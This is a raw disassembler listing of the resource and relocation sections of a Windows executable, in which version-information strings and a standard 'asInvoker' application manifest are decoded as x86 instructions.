  40c2ea:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  40c2ef:	add    BYTE PTR [eax],al
  40c2f1:	add    BYTE PTR [eax],al
  40c2f3:	add    BYTE PTR [esi],bh
  40c2f5:	add    BYTE PTR [ebx],cl
  40c2f7:	add    BYTE PTR [ecx],al
  40c2f9:	add    BYTE PTR [edi+0x0],cl
  40c2fc:	jb     0x40c2fe
  40c2fe:	imul   eax,DWORD PTR [eax],0x690067
  40c304:	outs   dx,BYTE PTR ds:[esi]
  40c305:	add    BYTE PTR [ecx+0x0],ah
  40c308:	ins    BYTE PTR es:[edi],dx
  40c309:	add    BYTE PTR [esi+0x0],al
  40c30c:	imul   eax,DWORD PTR [eax],0x65006c
  40c312:	outs   dx,BYTE PTR ds:[esi]
  40c313:	add    BYTE PTR [ecx+0x0],ah
  40c316:	ins    DWORD PTR es:[edi],dx
  40c317:	add    BYTE PTR [ebp+0x0],ah
  40c31a:	add    BYTE PTR [eax],al
  40c31c:	push   edx
  40c31d:	add    BYTE PTR [ebp+0x0],ah
  40c320:	jae    0x40c322
  40c322:	inc    edi
  40c323:	add    BYTE PTR [ebp+0x0],ah
  40c326:	outs   dx,BYTE PTR ds:[esi]
  40c327:	add    BYTE PTR [esi],ch
  40c329:	add    BYTE PTR [ebp+0x0],ah
  40c32c:	js     0x40c32e
  40c32e:	add    BYTE PTR gs:[eax],al
  40c331:	add    BYTE PTR [eax],al
  40c333:	add    BYTE PTR [eax+eax*1+0x1a],dl
  40c337:	add    BYTE PTR [ecx],al
  40c339:	add    BYTE PTR [eax+0x0],dl
  40c33c:	jb     0x40c33e
  40c33e:	outs   dx,DWORD PTR ds:[esi]
  40c33f:	add    BYTE PTR [eax+eax*1+0x75],ah
  40c343:	add    BYTE PTR [ebx+0x0],ah
  40c346:	je     0x40c348
  40c348:	dec    esi
  40c349:	add    BYTE PTR [ecx+0x0],ah
  40c34c:	ins    DWORD PTR es:[edi],dx
  40c34d:	add    BYTE PTR [ebp+0x0],ah
  40c350:	add    BYTE PTR [eax],al
  40c352:	add    BYTE PTR [eax],al
  40c354:	dec    ebp
  40c355:	add    BYTE PTR [ecx+0x0],ch
  40c358:	arpl   WORD PTR [eax],ax
  40c35a:	jb     0x40c35c
  40c35c:	outs   dx,DWORD PTR ds:[esi]
  40c35d:	add    BYTE PTR [ebx+0x0],dh
  40c360:	outs   dx,DWORD PTR ds:[esi]
  40c361:	add    BYTE PTR [esi+0x0],ah
  40c364:	je     0x40c366
  40c366:	scas   al,BYTE PTR es:[edi]
  40c367:	add    BYTE PTR [eax],ah
  40c369:	add    BYTE PTR [esi],ch
  40c36b:	add    BYTE PTR [esi+0x0],cl
  40c36e:	inc    ebp
  40c36f:	add    BYTE PTR [eax+eax*1+0x20],dl
  40c373:	add    BYTE PTR [esi+0x0],al
  40c376:	jb     0x40c378
  40c378:	popa   
  40c379:	add    BYTE PTR [ebp+0x0],ch
  40c37c:	add    BYTE PTR gs:[edi+0x0],dh
  40c380:	outs   dx,DWORD PTR ds:[esi]
  40c381:	add    BYTE PTR [edx+0x0],dh
  40c384:	imul   eax,DWORD PTR [eax],0x0
  40c387:	add    BYTE PTR [edx+0x0],al
  40c38a:	sldt   WORD PTR [ecx]
  40c38d:	add    BYTE PTR [eax+0x0],dl
  40c390:	jb     0x40c392
  40c392:	outs   dx,DWORD PTR ds:[esi]
  40c393:	add    BYTE PTR [eax+eax*1+0x75],ah
  40c397:	add    BYTE PTR [ebx+0x0],ah
  40c39a:	je     0x40c39c
  40c39c:	push   esi
  40c39d:	add    BYTE PTR [ebp+0x0],ah
  40c3a0:	jb     0x40c3a2
  40c3a2:	jae    0x40c3a4
  40c3a4:	imul   eax,DWORD PTR [eax],0x6e006f
  40c3aa:	add    BYTE PTR [eax],al
  40c3ac:	xor    eax,DWORD PTR [eax]
  40c3ae:	add    BYTE PTR cs:0x33002e00,dh
  40c3b5:	add    BYTE PTR [eax],dh
  40c3b7:	add    BYTE PTR [edi],dh
  40c3b9:	add    BYTE PTR [edx],dh
  40c3bb:	add    BYTE PTR [ecx],bh
  40c3bd:	add    BYTE PTR [esi],ch
  40c3bf:	add    BYTE PTR [eax+eax*1],dh
  40c3c2:	xor    eax,0x37003000
  40c3c7:	add    BYTE PTR [eax],al
  40c3c9:	add    BYTE PTR [eax],al
  40c3cb:	add    BYTE PTR [eax+eax*1],dh
  40c3ce:	push   cs
  40c3cf:	add    BYTE PTR [ecx],al
  40c3d1:	add    BYTE PTR [ebx+0x0],al
  40c3d4:	outs   dx,DWORD PTR ds:[esi]
  40c3d5:	add    BYTE PTR [ebp+0x0],ch
  40c3d8:	ins    DWORD PTR es:[edi],dx
  40c3d9:	add    BYTE PTR [ebp+0x0],ah
  40c3dc:	outs   dx,BYTE PTR ds:[esi]
  40c3dd:	add    BYTE PTR [eax+eax*1+0x73],dh
  40c3e1:	add    BYTE PTR [eax],al
  40c3e3:	add    BYTE PTR [esi+0x0],al
  40c3e6:	ins    BYTE PTR es:[edi],dx
  40c3e7:	add    BYTE PTR [ecx+0x0],ah
  40c3ea:	jbe    0x40c3ec
  40c3ec:	outs   dx,DWORD PTR ds:[esi]
  40c3ed:	add    BYTE PTR [edx+0x0],dh
  40c3f0:	cmp    eax,0x65005200
  40c3f5:	add    BYTE PTR [eax+eax*1+0x61],dh
  40c3f9:	add    BYTE PTR [ecx+0x0],ch
  40c3fc:	ins    BYTE PTR es:[edi],dx
  40c3fd:	add    BYTE PTR [eax],al
  40c3ff:	add    BYTE PTR [edx],dh
  40c401:	add    BYTE PTR [ecx],cl
  40c403:	add    BYTE PTR [ecx],al
  40c405:	add    BYTE PTR [eax+0x0],dl
  40c408:	jb     0x40c40a
  40c40a:	imul   eax,DWORD PTR [eax],0x610076
  40c410:	je     0x40c412
  40c412:	add    BYTE PTR gs:[edx+0x0],al
  40c416:	jne    0x40c418
  40c418:	imul   eax,DWORD PTR [eax],0x64006c
  40c41e:	add    BYTE PTR [eax],al
  40c420:	inc    esp
  40c421:	add    BYTE PTR [eax+eax*1+0x42],al
  40c425:	add    BYTE PTR [eax+eax*1+0x44],cl
  40c429:	add    BYTE PTR [edx],dh
  40c42b:	add    BYTE PTR [edx],dh
  40c42d:	add    BYTE PTR [esi],dh
  40c42f:	add    BYTE PTR [eax],al
  40c431:	add    BYTE PTR [eax],al
  40c433:	add    BYTE PTR [eax+eax*1+0x0],al
  40c437:	add    BYTE PTR [ecx],al
  40c439:	add    BYTE PTR [esi+0x0],dl
  40c43c:	popa   
  40c43d:	add    BYTE PTR [edx+0x0],dh
  40c440:	inc    esi
  40c441:	add    BYTE PTR [ecx+0x0],ch
  40c444:	ins    BYTE PTR es:[edi],dx
  40c445:	add    BYTE PTR [ebp+0x0],ah
  40c448:	dec    ecx
  40c449:	add    BYTE PTR [esi+0x0],ch
  40c44c:	data16 add BYTE PTR [edi+0x0],ch
  40c450:	add    BYTE PTR [eax],al
  40c452:	add    BYTE PTR [eax],al
  40c454:	and    al,0x0
  40c456:	add    al,0x0
  40c458:	add    BYTE PTR [eax],al
  40c45a:	push   esp
  40c45b:	add    BYTE PTR [edx+0x0],dh
  40c45e:	popa   
  40c45f:	add    BYTE PTR [esi+0x0],ch
  40c462:	jae    0x40c464
  40c464:	ins    BYTE PTR es:[edi],dx
  40c465:	add    BYTE PTR [ecx+0x0],ah
  40c468:	je     0x40c46a
  40c46a:	imul   eax,DWORD PTR [eax],0x6e006f
  40c470:	add    BYTE PTR [eax],al
  40c472:	add    BYTE PTR [eax],al
  40c474:	or     DWORD PTR [eax+esi*4],eax
  40c477:	add    al,0x3c
  40c479:	popa   
  40c47a:	jae    0x40c4ef
  40c47c:	gs ins DWORD PTR es:[edi],dx
  40c47e:	bound  ebp,QWORD PTR [ecx+edi*2+0x20]
  40c482:	js     0x40c4f1
  40c484:	ins    BYTE PTR es:[edi],dx
  40c485:	outs   dx,BYTE PTR ds:[esi]
  40c486:	jae    0x40c4c5
  40c488:	and    dh,BYTE PTR [ebp+0x72]
  40c48b:	outs   dx,BYTE PTR ds:[esi]
  40c48c:	cmp    dh,BYTE PTR [ebx+0x63]
  40c48f:	push   0x73616d65
  40c494:	sub    eax,0x7263696d
  40c499:	outs   dx,DWORD PTR ds:[esi]
  40c49a:	jae    0x40c50b
  40c49c:	data16 je 0x40c4cc
  40c49f:	arpl   WORD PTR [edi+0x6d],bp
  40c4a2:	cmp    ah,BYTE PTR [ecx+0x73]
  40c4a5:	ins    DWORD PTR es:[edi],dx
  40c4a6:	cs jbe 0x40c4da
  40c4a9:	and    ah,BYTE PTR [eax]
  40c4ab:	ins    DWORD PTR es:[edi],dx
  40c4ac:	popa   
  40c4ad:	outs   dx,BYTE PTR ds:[esi]
  40c4ae:	imul   esp,DWORD PTR [esi+0x65],0x65567473
  40c4b5:	jb     0x40c52a
  40c4b7:	imul   ebp,DWORD PTR [edi+0x6e],0x2e31223d
  40c4be:	xor    BYTE PTR [edx],ah
  40c4c0:	and    BYTE PTR ds:[edx],cl
  40c4c3:	and    BYTE PTR [eax],ah
  40c4c5:	and    BYTE PTR [eax],ah
  40c4c7:	and    BYTE PTR [eax],ah
  40c4c9:	cmp    al,0x74
  40c4cb:	jb     0x40c542
  40c4cd:	jae    0x40c543
  40c4cf:	dec    ecx
  40c4d0:	outs   dx,BYTE PTR ds:[esi]
  40c4d1:	outs   dx,WORD PTR ds:[esi]
  40c4d3:	and    BYTE PTR [eax+0x6d],bh
  40c4d6:	ins    BYTE PTR es:[edi],dx
  40c4d7:	outs   dx,BYTE PTR ds:[esi]
  40c4d8:	jae    0x40c517
  40c4da:	and    dh,BYTE PTR [ebp+0x72]
  40c4dd:	outs   dx,BYTE PTR ds:[esi]
  40c4de:	cmp    dh,BYTE PTR [ebx+0x63]
  40c4e1:	push   0x73616d65
  40c4e6:	sub    eax,0x7263696d
  40c4eb:	outs   dx,DWORD PTR ds:[esi]
  40c4ec:	jae    0x40c55d
  40c4ee:	data16 je 0x40c51e
  40c4f1:	arpl   WORD PTR [edi+0x6d],bp
  40c4f4:	cmp    ah,BYTE PTR [ecx+0x73]
  40c4f7:	ins    DWORD PTR es:[edi],dx
  40c4f8:	cs jbe 0x40c52e
  40c4fb:	and    bh,BYTE PTR [esi]
  40c4fd:	and    BYTE PTR [edx],cl
  40c4ff:	and    BYTE PTR [eax],ah
  40c501:	and    BYTE PTR [eax],ah
  40c503:	and    BYTE PTR [eax],ah
  40c505:	and    BYTE PTR [eax],ah
  40c507:	cmp    al,0x73
  40c509:	arpl   WORD PTR gs:[ebp+0x72],si
  40c50d:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a20
  40c515:	and    BYTE PTR [eax],ah
  40c517:	and    BYTE PTR [eax],ah
  40c519:	and    BYTE PTR [eax],ah
  40c51b:	and    BYTE PTR [eax],ah
  40c51d:	cmp    al,0x72
  40c51f:	gs jno 0x40c597
  40c522:	gs jae 0x40c599
  40c525:	gs fs push eax
  40c528:	jb     0x40c593
  40c52a:	jbe    0x40c595
  40c52c:	ins    BYTE PTR es:[edi],dx
  40c52d:	gs addr16 gs jae 0x40c570
  40c532:	and    BYTE PTR [edx],cl
  40c534:	and    BYTE PTR [eax],ah
  40c536:	and    BYTE PTR [eax],ah
  40c538:	and    BYTE PTR [eax],ah
  40c53a:	and    BYTE PTR [eax],ah
  40c53c:	and    BYTE PTR [eax],ah
  40c53e:	and    BYTE PTR [eax],ah
  40c540:	cmp    al,0x72
  40c542:	gs jno 0x40c5ba
  40c545:	gs jae 0x40c5bc
  40c548:	gs fs inc ebp
  40c54b:	js     0x40c5b2
  40c54d:	arpl   WORD PTR [ebp+0x74],si
  40c550:	imul   ebp,DWORD PTR [edi+0x6e],0x6576654c
  40c557:	ins    BYTE PTR es:[edi],dx
  40c558:	and    BYTE PTR [edx],cl
  40c55a:	and    BYTE PTR [eax],ah
  40c55c:	and    BYTE PTR [eax],ah
  40c55e:	and    BYTE PTR [eax],ah
  40c560:	and    BYTE PTR [eax],ah
  40c562:	and    BYTE PTR [eax],ah
  40c564:	and    BYTE PTR [eax],ah
  40c566:	and    BYTE PTR [eax],ah
  40c568:	ins    BYTE PTR es:[edi],dx
  40c569:	gs jbe 0x40c5d1
  40c56c:	ins    BYTE PTR es:[edi],dx
  40c56d:	cmp    eax,0x49736122
  40c572:	outs   dx,BYTE PTR ds:[esi]
  40c573:	jbe    0x40c5e4
  40c575:	imul   esp,DWORD PTR [ebp+0x72],0x22
  40c579:	and    BYTE PTR [edx],cl
  40c57b:	and    BYTE PTR [eax],ah
  40c57d:	and    BYTE PTR [eax],ah
  40c57f:	and    BYTE PTR [eax],ah
  40c581:	and    BYTE PTR [eax],ah
  40c583:	and    BYTE PTR [eax],ah
  40c585:	and    BYTE PTR [eax],ah
  40c587:	and    BYTE PTR [eax],ah
  40c589:	jne    0x40c5f4
  40c58b:	inc    ecx
  40c58c:	arpl   WORD PTR [ebx+0x65],sp
  40c58f:	jae    0x40c604
  40c591:	cmp    eax,0x6c616622
  40c596:	jae    0x40c5fd
  40c598:	and    ch,BYTE PTR [edi]
  40c59a:	and    BYTE PTR ds:[edx],cl
  40c59d:	and    BYTE PTR [eax],ah
  40c59f:	and    BYTE PTR [eax],ah
  40c5a1:	and    BYTE PTR [eax],ah
  40c5a3:	and    BYTE PTR [eax],ah
  40c5a5:	and    BYTE PTR [eax],ah
  40c5a7:	cmp    al,0x2f
  40c5a9:	jb     0x40c610
  40c5ab:	jno    0x40c622
  40c5ad:	gs jae 0x40c624
  40c5b0:	gs fs push eax
  40c5b3:	jb     0x40c61e
  40c5b5:	jbe    0x40c620
  40c5b7:	ins    BYTE PTR es:[edi],dx
  40c5b8:	gs addr16 gs jae 0x40c5fb
  40c5bd:	and    BYTE PTR [edx],cl
  40c5bf:	and    BYTE PTR [eax],ah
  40c5c1:	and    BYTE PTR [eax],ah
  40c5c3:	and    BYTE PTR [eax],ah
  40c5c5:	and    BYTE PTR [eax],ah
  40c5c7:	cmp    al,0x2f
  40c5c9:	jae    0x40c630
  40c5cb:	arpl   WORD PTR [ebp+0x72],si
  40c5ce:	imul   esi,DWORD PTR [ecx+edi*2+0x3e],0x20200a20
  40c5d6:	and    BYTE PTR [eax],ah
  40c5d8:	and    BYTE PTR [eax],ah
  40c5da:	cmp    al,0x2f
  40c5dc:	je     0x40c650
  40c5de:	jne    0x40c653
  40c5e0:	je     0x40c62b
  40c5e2:	outs   dx,BYTE PTR ds:[esi]
  40c5e3:	outs   dx,WORD PTR ds:[esi]
  40c5e5:	and    BYTE PTR ds:[edx],cl
  40c5e8:	and    BYTE PTR [eax],ah
  40c5ea:	and    BYTE PTR [eax],ah
  40c5ec:	cmp    al,0x2f
  40c5ee:	popa   
  40c5ef:	jae    0x40c664
  40c5f1:	gs ins DWORD PTR es:[edi],dx
  40c5f3:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
	...

Disassembly of section .reloc:

0040e000 <.reloc>:
  40e000:	add    BYTE PTR [eax+0xc0000],dh
  40e006:	add    BYTE PTR [eax],al
  40e008:	lock cmp al,BYTE PTR [eax]
	...
